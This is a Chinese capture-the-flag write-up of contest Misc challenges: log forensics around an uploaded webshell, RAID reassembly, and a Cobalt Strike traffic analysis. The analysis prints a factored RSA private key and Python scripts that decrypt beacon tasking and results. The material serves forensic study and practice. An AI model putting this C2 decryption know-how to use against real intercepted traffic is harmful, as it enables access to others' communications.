# 2025 西湖论剑·中国杭州网络安全技能大赛 Misc Writeup

**最近这一段时间一直被科研和毕设上的事拖着，因此就有段时间没有做Misc题了**

**趁着写毕设没啥思路和动力的功夫，来稍微复盘下今年西湖论剑的题**
<!--more-->

|               ![](imgs/image-20250118233839169.png)<br><br>               |
| :-----------------------------------------------------------------------: |
| 本文中涉及的具体题目附件可以进我的[知识星球](https://t.zsxq.com/an6p6)获取 |

## 线上初赛


### 题目名称 easydatalog

> 题面信息如下：
> 请你对附件中的日志文件进行分析，找出“张三”的身份证号和手机号，譬如其身份证号是119795199308186673，手机号是73628276413，则提交的flag为“119795199308186673_73628276413”。

题目附件给了 access.log 和 error.log 两个日志文件

简单翻看后，我们重点关注error.log，发现传了一个PHP的Webshell

![](imgs/image-20250118234608767.png)

继续翻看日志文件，可以发现出题人传了一个压缩包还有一个JPG图片

![](imgs/image-20250118234928372.png)

![](imgs/image-20250118234945856.png)

由于是分段传输，因此我们手动删除每段间的无效数据，把这两个文件提取出来

![](imgs/image-20250118235554420.jpeg)


发现压缩包是加密的，里面有个data.csv，因此猜测需要从那张JPG图片中得到解压密码

经过尝试，发现JPG图片是盲水印隐写，直接用工具提取即可

![](imgs/image-20250118235248538.png)

![](imgs/image-20250118235359515.png)

使用得到的密码解压压缩包即可得到张三的信息，即flag：`DASCTF{30601319731003117X_79159498824}`

### 题目名称 糟糕的磁盘

题目附件给了五个img文件，查看后发现是Linux下RAID格式的磁盘文件

![](imgs/image-20250228162745234.png)

![](imgs/image-20250228162829496.png)

压缩包注释中也给了提示：`I only remember the block size is 512KB`

#### 方法一：(UFS直接重组)

软件下载链接：[UFS Explorer Professional Recovery 9.18](https://cangshui.net/5257.html)

直接用UFS打开五个img文件即可，软件会自动重组，然后点击最下面那个kali

![](imgs/image-20250228162941848.png)

发现里面有一张`key.png`和一个`secret`文件，其中`secret`文件大小为10MB

因此猜测是VC创建的加密镜像，密钥就是`key.png`

尝试使用`key.png`作为密钥挂载，挂载成功后得到`flag.txt`

![](imgs/image-20250228163404243.png)



![](imgs/image-20250228163328475.png)

打开即可得到flag：`DASCTF{R41D_4ND_D15K_M4573R}`

![](imgs/image-20250228163309963.png)

#### 方法二：在Ubuntu下用losetup和mdadm进行组装挂载

在WSL2(Ubuntu20.04)中运行一下命令即可成功挂载

```bash
sudo losetup -fP m8X4exzG.img  # 绑定第一个镜像文件到一个空闲的 loop 设备，并解析其分区表
sudo losetup -fP Fsiq6lKn.img
sudo losetup -fP gSoNiXLC.img
sudo losetup -fP suPVGqm6.img
sudo losetup -fP uGZ85OzT.img
sudo losetup -a  # 查看当前所有已绑定的 loop 设备及其对应的文件
cat /proc/mdstat  # 查看当前系统中已组装的 RAID 设备状态
sudo mount /dev/md127 tmp  # 挂载 RAID 设备 md127 到 tmp 目录，尝试访问其内容
ls -al tmp
sudo umount tmp  # 卸载 tmp 目录，释放 md127 设备的挂载
sudo mdadm --stop /dev/md127  # 停止 RAID 设备 md127，释放相关 loop 设备的占用
sudo losetup -d /dev/loop0  # 解除 loop0 设备的绑定
sudo losetup -d /dev/loop1
sudo losetup -d /dev/loop2
sudo losetup -d /dev/loop3
sudo losetup -d /dev/loop4

# 检查 /dev/loop0 至 /dev/loop4 上的每个设备的 RAID 元数据（查看设备是否是 RAID 阵列的一部分）
sudo mdadm --examine /dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4   
# 创建一个名为 /dev/md127 的 RAID 0 阵列，包含 5 个设备（/dev/loop0 至 /dev/loop4）
sudo mdadm --create /dev/md127 --level=0 --raid-devices=5 /dev/loop0 /dev/loop1 /dev/loop2 /dev/loop3 /dev/loop4   

```

> Tips:这里我的WSL2可能启用了 `mdadm` 的 **自动检测和组装**，因此会在发现 `RAID` 元数据时自动创建 `/dev/md127`

![](imgs/image-20250302105806686.png)

但是当我尝试在kali上执行以上操作的时候，它不会自动识别 `RAID` 阵列并自动挂载

![](imgs/image-20250302111821199.png)

因此还是建议在Ubuntu系统下进行以上操作

### 题目名称 DSASignatureData

> 题面信息如下：
> 请你对附件中的流量文件进行分析，在该流量里有一些个人信息数据。附件中还有一份个人信息的签名数据 data-sign.csv（其中签名算法采用 DSA，哈希算法采用 SHA256）和一组公钥文件（位于 public 文件夹中，文件名格式为 public-XXXX.pem，其中 XXXX 为 userid 左侧补零至四位数，即个人用户对应的公钥文件）。由于数据可能在传输过程中被篡改过，因此需要你进行签名验证，验证数据是否被篡改。找出被篡改过的个人信息数据并保存到新的 csv 文件中（文件编码 utf-8，文件格式和 data.csv 保持一致），并将该文件上传至该题的校验平台（在该校验平台里可以下载该题的示例文件 example.csv，可作为该题的格式参考），校验达标即可拿到 flag。



### 题面名称 easyrawencode


### 题目名称 cscs

题目附件给了一个流量包，稍微翻看了一下发现主要是HTTP流量

然后结合题目的名称已经流量包中的特征`submit.php`以及心跳包，可以知道是CobalStrike流量分析

![](imgs/image-20250226234433708.png)

但是这题和之前遇见的常规的CS流量直接给java序列化后的密钥对文件不同，这题它给了我们 Beacon

> 在 Cobalt Strike 中，Beacon 是一种后门 payload，旨在提供持续的访问控制和通信通道。它被植入目标系统后，能够通过多种隐蔽的通信方式（如 HTTP/HTTPS）与攻击者的控制服务器进行定期的交互，执行命令、获取敏感信息并保持持久化。这使得 Beacon 成为渗透测试和红队操作中用于维持长期控制、获取系统信息和横向移动的重要工具。

![](imgs/image-20250226235242533.png)

然后去网上找相关的文章，可以找到下面这些文章：

https://www.freebuf.com/articles/system/327060.html

https://www.freebuf.com/articles/network/407982.html

![](imgs/image-20250226235541882.jpeg)

从文章中我们可以知道 `mB9u` 其实是上图第三步中Beacon随机生成的URL地址

并且结合文章中中的计算方法 `(ord('m')+ord('B')+ord('9')+ord('u')) % 256 = 93`

可以找到受害者的主机是64位的(上面结果如果是92对应32位，93则对应64位)

然后我们跟着参考文章中的，使用 [1768.py](https://github.com/minhangxiaohui/CSthing/blob/master/1768_v0_0_8/1768.py) 去解析题目中给我们的 Beacon 文件

![](imgs/image-20250226235842380.png)

我们可以在解析结果中得到公钥，用CyberChef转换一下，并补上PEM的开头和结尾

![](imgs/image-20250227000008671.png)

```
-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahxXKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
-----END PUBLIC KEY-----
```

然后我们手动解析一下公钥，并尝试分解一下n

![](imgs/image-20250227000147085.png)

发现`yafu`可以分解 n 得到 p 和 q

![](imgs/image-20250227000303830.png)

我们使用`rsatool.py`结合得到的 p 和 q 生成一下PEM格式的私钥

![](imgs/image-20250227000531067.png)

```
-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO
FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1
qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg
p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
-----END RSA PRIVATE KEY-----
```

然后后续的步骤就和常规的CobalStrike流量分析一样了

首先使用私钥去解密心跳包中的cookie信息得到`AES_KEY`和`HMAC_KEY`

```python
import base64
import hashlib
import hexdump
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5


privateKey = '''-----BEGIN RSA PRIVATE KEY-----
MIICWgIBAAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75Nd+ZUnvR2bYsO
FiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAEC
gYApWVrrvY2c0zZKu/VjQ/ivQUPy0b63GmVyS1Lg8frzAiAaESnE2Pl6bwsGbxTE
I+3jeYuE1IdWOAeMnKPhY80fOSgws6vSri7CcxnMUEEn3AMw4YSwBIaBGkdLnfxf
pbS/kUUb/z7/A1SRtNq1n4hZYinnG2NpUuiO1WqwHqOGoQJBAJE14+VVt8ONGIZ1
qIf4cqAnAmtonPhyDNdYZQC0IlxNzyixo/lnlTc80b3jYUA4w8GGQQZea70op4RS
fIJV5J8CQQCRNePlVbfDjRiGdaiH+HKgJwJraJz4cgzXWGUAtCJcTc8osaP5Z5U3
PNG942FAOMPBhkEGXmu9KKeEUnyCVeNtAkAhlDeuCcNj6hXYyg592tsO49ZwZhGe
dik4Bw3cOsuTUr7r5yBHBUgBLQRHh/QuOLIz50rUITOC24rZU4XNUfV7AkB6vJQu
Ke+zaDVMoXKbyxIH8DEJXFkhXjUgZ+SnXZqVbmclPFEe48Cp+cxGtkRjJhfAIZwg
p/pk3lIJdDctay9ZAkBukZv1vD/LR3Y64R5xkoLIliyCTtHgUCY44xkJvQfCGchn
xSu0tBnGgSI3El1K1eOyT6NKSZGeQUGlLGcsBtcT
-----END RSA PRIVATE KEY-----'''

publicKey = '''-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgFJeF4Hy8C0TKngYptJput2/OTUsjSApDsIpT75N
d+ZUnvR2bYsOFiAACt+9ev+ZzXLwViPrDe8gImXPYx3YlazV6YHahCTAOilYlcgZSjFkHy7s1ahx
XKic2/lDPF1DdTh2dmbDvbD4YpVVN1tXT+QIqUroL5KWAIXUFjdPFlSzAgMBAAE=
-----END PUBLIC KEY-----'''
    
def get_AES_HMAC_key(PRIVATE_KEY,encode_data):
    # 提取协商密钥和主机信息
    private_key = RSA.import_key(PRIVATE_KEY.encode())
    cipher = PKCS1_v1_5.new(private_key)
    ciphertext = cipher.decrypt(base64.b64decode(encode_data), 0)
    if ciphertext[0:4] == b'\x00\x00\xBE\xEF':
        raw_aes_keys = ciphertext[8:24]
        raw_aes_hash256 = hashlib.sha256(raw_aes_keys).digest()
        aes_key = raw_aes_hash256[0:16]
        hmac_key = raw_aes_hash256[16:]
        hexdump.hexdump(ciphertext) # 主机信息
        return aes_key.hex(),hmac_key.hex()
    

if __name__ == "__main__":
    # 协商密钥和主机信息用RSA公钥加密之后放在了心跳包的cookie中
    cookie_data = "SLHAIOj8/1icVtP6fImtJz6B6wR0t/XwLg1G0Y3AxoxnseBfPONxoyjAWCCOH84IJULnCZZrO7cIRxJPS2PtmDD4MvD8/PIpoW8Gj8536vhwd+tyXjNKyLNyNYcj+JgO4N5FTnKtkONgv7KnsMjJC3E0eI0ctqmZll8SrXLUS9k="
    SHARED_KEY,HMAC_KEY = get_AES_HMAC_key(privateKey,cookie_data)
    print(f"AES key: {SHARED_KEY}")
    print(f"HMAC key: {HMAC_KEY}")

# 00000000: 00 00 BE EF 00 00 00 5D  28 AB 95 1F C9 6B CB 93  .......](....k..
# 00000010: EC 13 CF 9D D5 F2 13 73  A8 03 A8 03 43 50 DF EC  .......s....CP..
# 00000020: 00 00 0B 50 00 00 0E 06  01 1D B0 00 00 00 00 77  ...P...........w
# 00000030: 02 04 D0 77 02 34 70 8C  B8 A8 C0 57 49 4E 2D 52  ...w.4p....WIN-R
# 00000040: 52 49 39 54 39 53 4E 38  35 44 09 41 64 6D 69 6E  RI9T9SN85D.Admin
# 00000050: 69 73 74 72 61 74 6F 72  09 61 72 74 69 66 61 63  istrator.artifac
# 00000060: 74 2E 65 78 65                                    t.exe
# AES key: 9fe14473479a283821241e2af78017e8
# HMAC key: 1e3d54f1b9f0e106773a59b7c379a89d
```

然后使用得到到AES_KEY和HMAC_KEY去解密CS传输的数据

> Tips:
> 
> /cm：心跳包主要用于C2服务端要求客户端执行命令
> 
> /submit.php：主要用于传输客户端回传的执行结果

**解密心跳包中传输的数据**

```python
import hmac
import binascii
import base64
import hexdump
from Crypto.Cipher import AES

def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
    if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:
        print("message authentication failed")
        return
    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
    return cipher.decrypt(encrypted_data)

if __name__ == "__main__":
    SHARED_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8")
    HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d")
    with open('data.txt','r') as f:
        data = f.read()
    encrypt_data = bytes.fromhex(data)
    encrypt_data_length = len(encrypt_data)
    print(f"[+] 数据总长度为：{encrypt_data_length}")
    # encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False)
    data = encrypt_data[:encrypt_data_length-16]
    signature = encrypt_data[encrypt_data_length-16:]
    iv_bytes = b"abcdefghijklmnop"

    dec = decrypt(data, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
    print(f"{'='*80}")
    print("[+] counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False)))
    print("[+] 任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False)))
    print("[+] 任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
    pcapng_data = dec[64:-60]
    with open("out.pcapng",'wb') as f:
        f.write(pcapng_data)
    print(hexdump.hexdump(pcapng_data))
    # output = dec[12:int.from_bytes(dec[4:8], byteorder='big', signed=False)].decode('gbk',errors='ignore')
    # print(output)
```

**解密submit.php中回传的数据**

```python
import hmac
import binascii
import base64
import hexdump
from Crypto.Cipher import AES

def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
    if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:
        print("message authentication failed")
        return
    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
    return cipher.decrypt(encrypted_data)

if __name__ == "__main__":
    SHARED_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8")
    HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d")
    encrypt_datas = ["00000040efeda3e57f7d7fd589d11640ea0f9a4fe6bc91332723ffc5f43f78b37c21cc7485c44d6c8eb6af74fc7044046059c76519e493e351c9f631d6785d5c07eae9e3","000001602a99f7cc51face35199e8b1a4a5616e0301591b6f1f48b1d000149cb83d6a81e9659849a52c4f50a8629b0dfb7c036df406b44d449e40fe18df3594721e1f5849662271c1ea18b18c8eb58af5ee2c3a784852dd1c4a5c699f9518d2e2fc70d756cd68361ac794eed4eae6b062be6c31651caf93954f2a89b10e25b1fd9757ec17ee8b97038c4babb73c4f21688f5d235797844c2c9c288fac3fd2bd9cf5373956389b7e5232e35b6f268f9d67ba54f3e7e1606d4cb4020d5f480c6e5f4409b8d87e0443ae0bcfe93d286291ba6bfd0c7f37593581d90bb4ab7cfb065b4421a727f120fb491c2dc01797e38996dfc123fb120c5ed312577cc917d8a435b73c25b6d29ef0bad595100256c9aa5571e5c0ce0a8ea2c173ca1fae577fa924506b75b86522052f019d6843d74dc6fbdf2219b77e020a049c4e77df3658c80bcb703f8f878ff2f70c5c69d0cf6f4efb5a755ba854dfa5777a23989286770da6e0444d0","000000d0c72ef8b74a7d8acc332695b62448280f9a4eaa12457de4adcad279b0563f2d4cb0707f7e2853c45acf28a365d905cf8ca421d557bd7655cbd50aafbdbe5f3f570c9c3d876d0c21b661ca5c46e09f987f7e1263f6d33c34db28a2fd342fe48e5801d1a97fb88e00f0c648ec889f6b72d71edd2eed5affd32bc8d51e27fcc148d16823c1bc235b0e16d9d477bd0b4582941db373e171cce78b10c869eb987baf3fd9f879b236be6f3af43b7742f6241dfe02ab696c96f1779d0003d6b2720d1c93890e75fcce939f1c8e0922ce5044bc3a","00000100f24f15cd6f33c36e70ca228d10babfac1cf6bfbb9b6923a7828c9ed30b76d3ce1cb3d8f97c358bf90004e771ac646b1b996fd248ac8f0b460e0a36950dffcde04f3bae831982b528393f3a3c771310ba0c0bb7418ba5e8734a6bd37bc8a51cc0683c0904e0f404180e4c4c34720a3e5d6767c435f1746e6b93a13a2ecdc8074089e684b90748fc1a7e24e66bd637673437d9e24a37ce6f584b478e2f0485f3c05414dd4c35eb9ecfed8d4fbdab54db4233258f4fea6ed515a1030feeb184db94a4841236b491d2f7379e10f52d50ae573cd6f4504aa9750da273fa65c2a9eaf9b9bb014cafc53a9e9f0042bfcd5d24fc1b29173fd3308ff08d30b2a7d42132d4"]
    for encrypt_data in encrypt_datas:
        # encrypt_data = base64.b64decode(encrypt_data)
        encrypt_data = bytes.fromhex(encrypt_data)
        encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False)
        encrypt_data_l = encrypt_data[4:]
        data1 = encrypt_data_l[:encrypt_data_length-16]
        signature = encrypt_data_l[encrypt_data_length-16:]
        iv_bytes = b"abcdefghijklmnop"

        dec = decrypt(data1, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
        print(f"{'='*80}")
        print("[+] counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False)))
        print("[+] 任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False)))
        print("[+] 任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
        output = dec[12:int.from_bytes(dec[4:8], byteorder='big', signed=False)].decode('gbk',errors='ignore')
        print(hexdump.hexdump(dec))
        print(output)
```

上面两个代码的主要区别就在于：第二个代码中的加密数据是从源数据的第四字节开始的

我们用第二个代码解密`submit.php`的数据，可以得到如下内容，并且发现里面有个`secret.pcapng`

```
================================================================================
[+] counter: 2
[+] 任务返回长度: 35
[+] 任务输出类型: 30
00000000: 00 00 00 02 00 00 00 23  00 00 00 1E 77 69 6E 2D  .......#....win-
00000010: 72 72 69 39 74 39 73 6E  38 35 64 5C 61 64 6D 69  rri9t9sn85d\admi
00000020: 6E 69 73 74 72 61 74 6F  72 0D 0A 00 5C 00 44 00  nistrator...\.D.
None
win-rri9t9sn85d\adminis
================================================================================
[+] counter: 3
[+] 任务返回长度: 324
[+] 任务输出类型: 30
00000000: 00 00 00 03 00 00 01 44  00 00 00 1E 20 C7 FD B6  .......D.... ...
00000010: AF C6 F7 20 43 20 D6 D0  B5 C4 BE ED C3 BB D3 D0  ... C ..........
00000020: B1 EA C7 A9 A1 A3 0D 0A  20 BE ED B5 C4 D0 F2 C1  ........ .......
00000030: D0 BA C5 CA C7 20 31 38  37 30 2D 33 35 35 33 0D  ..... 1870-3553.
00000040: 0A 0D 0A 20 43 3A 5C 55  73 65 72 73 5C 41 64 6D  ... C:\Users\Adm
00000050: 69 6E 69 73 74 72 61 74  6F 72 5C 44 65 73 6B 74  inistrator\Deskt
00000060: 6F 70 20 B5 C4 C4 BF C2  BC 0D 0A 0D 0A 32 30 32  op ..........202
00000070: 34 2F 31 32 2F 31 36 20  20 31 35 3A 30 35 20 20  4/12/16  15:05
00000080: 20 20 3C 44 49 52 3E 20  20 20 20 20 20 20 20 20    <DIR>
00000090: 20 2E 0D 0A 32 30 32 34  2F 31 32 2F 31 36 20 20   ...2024/12/16
000000A0: 31 35 3A 30 35 20 20 20  20 3C 44 49 52 3E 20 20  15:05    <DIR>
000000B0: 20 20 20 20 20 20 20 20  2E 2E 0D 0A 32 30 32 34          ....2024
000000C0: 2F 31 32 2F 31 36 20 20  31 35 3A 30 35 20 20 20  /12/16  15:05
000000D0: 20 20 20 20 20 20 20 20  20 31 37 2C 39 32 30 20           17,920
000000E0: 61 72 74 69 66 61 63 74  2E 65 78 65 0D 0A 20 20  artifact.exe..
000000F0: 20 20 20 20 20 20 20 20  20 20 20 20 20 31 20 B8               1 .
00000100: F6 CE C4 BC FE 20 20 20  20 20 20 20 20 20 31 37  .....         17
00000110: 2C 39 32 30 20 D7 D6 BD  DA 0D 0A 20 20 20 20 20  ,920 ......
00000120: 20 20 20 20 20 20 20 20  20 20 32 20 B8 F6 C4 BF            2 ....
00000130: C2 BC 20 35 31 2C 31 36  36 2C 36 30 31 2C 32 31  .. 51,166,601,21
00000140: 36 20 BF C9 D3 C3 D7 D6  BD DA 0D 0A 00 00 00 00  6 ..............
None
 驱动器 C 中的卷没有标签。
 卷的序列号是 1870-3553

 C:\Users\Administrator\Desktop 的目录

2024/12/16  15:05    <DIR>          .
2024/12/16  15:05    <DIR>          ..
2024/12/16  15:05            17,920 artifact.exe
               1 个文件         17,920 字节
               2 个目录 51,166,601,216 可
================================================================================
[+] counter: 4
[+] 任务返回长度: 173
[+] 任务输出类型: 22
00000000: 00 00 00 04 00 00 00 AD  00 00 00 16 00 00 00 01  ................
00000010: 43 3A 5C 55 73 65 72 73  5C 41 64 6D 69 6E 69 73  C:\Users\Adminis
00000020: 74 72 61 74 6F 72 5C 44  65 73 6B 74 6F 70 5C 2A  trator\Desktop\*
00000030: 0A 44 09 30 09 31 32 2F  31 36 2F 32 30 32 34 20  .D.0.12/16/2024
00000040: 31 35 3A 30 35 3A 34 32  09 2E 0A 44 09 30 09 31  15:05:42...D.0.1
00000050: 32 2F 31 36 2F 32 30 32  34 20 31 35 3A 30 35 3A  2/16/2024 15:05:
00000060: 34 32 09 2E 2E 0A 46 09  31 37 39 32 30 09 31 32  42....F.17920.12
00000070: 2F 31 36 2F 32 30 32 34  20 31 35 3A 30 35 3A 33  /16/2024 15:05:3
00000080: 30 09 61 72 74 69 66 61  63 74 2E 65 78 65 0A 46  0.artifact.exe.F
00000090: 09 32 38 32 09 30 38 2F  32 33 2F 32 30 31 37 20  .282.08/23/2017
000000A0: 31 34 3A 31 38 3A 33 35  09 64 65 73 6B 74 6F 70  14:18:35.desktop
000000B0: 2E 69 6E 69 0A 00 00 00  00 00 00 00 00 00 00 00  .ini............
None
C:\Users\Administrator\Desktop\*
D       0       12/16/2024 15:05:42     .
D       0       12/16/2024 15:05:42     ..
F       17920   12/16/2024 15:05:30     artifact.exe
F       282     08/23/2017 14:18:35     desk
================================================================================
[+] counter: 5
[+] 任务返回长度: 216
[+] 任务输出类型: 22
00000000: 00 00 00 05 00 00 00 D8  00 00 00 16 00 00 00 02  ................
00000010: 43 3A 5C 55 73 65 72 73  5C 41 64 6D 69 6E 69 73  C:\Users\Adminis
00000020: 74 72 61 74 6F 72 5C 44  65 73 6B 74 6F 70 5C 2A  trator\Desktop\*
00000030: 0A 44 09 30 09 31 32 2F  31 36 2F 32 30 32 34 20  .D.0.12/16/2024
00000040: 31 35 3A 30 38 3A 33 31  09 2E 0A 44 09 30 09 31  15:08:31...D.0.1
00000050: 32 2F 31 36 2F 32 30 32  34 20 31 35 3A 30 38 3A  2/16/2024 15:08:
00000060: 33 31 09 2E 2E 0A 46 09  31 37 39 32 30 09 31 32  31....F.17920.12
00000070: 2F 31 36 2F 32 30 32 34  20 31 35 3A 30 35 3A 33  /16/2024 15:05:3
00000080: 30 09 61 72 74 69 66 61  63 74 2E 65 78 65 0A 46  0.artifact.exe.F
00000090: 09 32 38 32 09 30 38 2F  32 33 2F 32 30 31 37 20  .282.08/23/2017
000000A0: 31 34 3A 31 38 3A 33 35  09 64 65 73 6B 74 6F 70  14:18:35.desktop
000000B0: 2E 69 6E 69 0A 46 09 33  34 39 35 38 38 09 31 32  .ini.F.349588.12
000000C0: 2F 31 36 2F 32 30 32 34  20 31 35 3A 30 38 3A 33  /16/2024 15:08:3
000000D0: 31 09 73 65 63 72 65 74  2E 70 63 61 70 6E 67 0A  1.secret.pcapng.
000000E0: 00 00 00 00 00 00 00 00  40 6F CC FE FE 07 00 00  ........@o......
None
C:\Users\Administrator\Desktop\*
D       0       12/16/2024 15:08:31     .
D       0       12/16/2024 15:08:31     ..
F       17920   12/16/2024 15:05:30     artifact.exe
F       282     08/23/2017 14:18:35     desktop.ini
F       349588  12/16/2024 15:08:31     secret
```

我们用第一个代码解密`C2服务端(10.11.4.3)`要求客户端执行命令的最大的那个数据包，可以得到一个`pacpng`流量包文件

结合第二个代码解密出来的`submit.php`的数据，应该就是那个`secret.pcapng`了

![](imgs/image-20250227214140287.png)

用以下代码解其余心跳包的数据可以得到攻击者要求受害客户端执行的其他命令

```python
import hmac
import binascii
import base64
import hexdump
from Crypto.Cipher import AES

def decrypt(encrypted_data, iv_bytes, signature, shared_key, hmac_key):
    if hmac.new(hmac_key, encrypted_data, digestmod="sha256").digest()[:16] != signature:
        print("message authentication failed")
        return
    cipher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)
    return cipher.decrypt(encrypted_data)

if __name__ == "__main__":
    SHARED_KEY = binascii.unhexlify("9fe14473479a283821241e2af78017e8")
    HMAC_KEY = binascii.unhexlify("1e3d54f1b9f0e106773a59b7c379a89d")
    data = ["75c02fc5b995a17bc6aa35cb218d77673c2779496c263e60ad2e72308f04c7fc45945bc005c0581f68cde2d86f427559","2861dcee3abe0beb543a42a83f765f8e8447799da043820c2fa534f47ef86e84bcb75dbab2b13772c66626d9461b64dffbd222ab8cb6098675785d68a054580a","01f629f493a28c3f2c4fe5aa660bba59d58aa1f464c1d359d6682f6f166e8c2c0a8b8639a577108a7ba285fa2314ee0b3cf150f69ad4311680e15b55994a0260","7277c5f144e04d2eaefa418ad6003a2350e8dfabb3e295b4d427679198881b6a12207b0b9d99831218db551b8469f577"]
    for item in data:
        encrypt_data = bytes.fromhex(item)
        encrypt_data_length = len(encrypt_data)
        print(f"[+] 数据总长度为：{encrypt_data_length}")
        # encrypt_data_length = int.from_bytes(encrypt_data[:4], byteorder='big', signed=False)
        data = encrypt_data[:encrypt_data_length-16]
        signature = encrypt_data[encrypt_data_length-16:]
        iv_bytes = b"abcdefghijklmnop"

        dec = decrypt(data, iv_bytes, signature, SHARED_KEY, HMAC_KEY)
        print(f"{'='*80}")
        print("[+] counter: {}".format(int.from_bytes(dec[:4], byteorder='big', signed=False)))
        print("[+] 任务返回长度: {}".format(int.from_bytes(dec[4:8], byteorder='big', signed=False)))
        print("[+] 任务输出类型: {}".format(int.from_bytes(dec[8:12], byteorder='big', signed=False)))
        print(hexdump.hexdump(dec))
```

```python
[+] 数据总长度为：48
================================================================================
[+] counter: 1734332826
[+] 任务返回长度: 16
[+] 任务输出类型: 4
00000000: 67 5F D1 9A 00 00 00 10  00 00 00 04 00 00 00 08  g_..............
00000010: 00 00 00 64 00 00 00 5A  41 41 41 41 41 41 41 41  ...d...ZAAAAAAAA
None
[+] 数据总长度为：64
================================================================================
[+] counter: 1734332874
[+] 任务返回长度: 37
[+] 任务输出类型: 78
00000000: 67 5F D1 CA 00 00 00 25  00 00 00 4E 00 00 00 1D  g_.....%...N....
00000010: 00 00 00 09 25 43 4F 4D  53 50 45 43 25 00 00 00  ....%COMSPEC%...
00000020: 0A 20 2F 43 20 77 68 6F  61 6D 69 00 00 41 41 41  . /C whoami..AAA
None
[+] 数据总长度为：64
================================================================================
[+] counter: 1734332876
[+] 任务返回长度: 34
[+] 任务输出类型: 78
00000000: 67 5F D1 CC 00 00 00 22  00 00 00 4E 00 00 00 1A  g_....."...N....
00000010: 00 00 00 09 25 43 4F 4D  53 50 45 43 25 00 00 00  ....%COMSPEC%...
00000020: 07 20 2F 43 20 64 69 72  00 00 41 41 41 41 41 41  . /C dir..AAAAAA
None
[+] 数据总长度为：48
================================================================================
[+] counter: 1734332896
[+] 任务返回长度: 19
[+] 任务输出类型: 53
00000000: 67 5F D1 E0 00 00 00 13  00 00 00 35 00 00 00 0B  g_.........5....
00000010: 00 00 00 01 00 00 00 03  2E 5C 2A 41 41 41 41 41  .........\*AAAAA
None
```

仔细观察以上数据其实可以发现攻击者一共就要求执行了`whoami`和`dir`这两个命令

然后我们将解密得到的流量包文件保存为`secret.pcapng`，打开翻看，发现主要是UDP流量

![](imgs/image-20250227214805641.png)


![](imgs/image-20250227214831328.png)

赛后和师傅们交流后知道了是`CS(反恐精英)1.6`的流量，这里的出题思路参考自 [2021L3HCTF Lambda](https://www.anquanke.com/post/id/261339#h2-0)

这也呼应了题目名(CSCS)，CS流量里套了一个`CS(反恐精英)1.6`流量

> [ReHLDS](https://github.com/rehlds/ReHLDS/) 是一个 C++ 开源项目，它是 HLDS（Half-Life Dedicated Server）的一个优化版本
> 
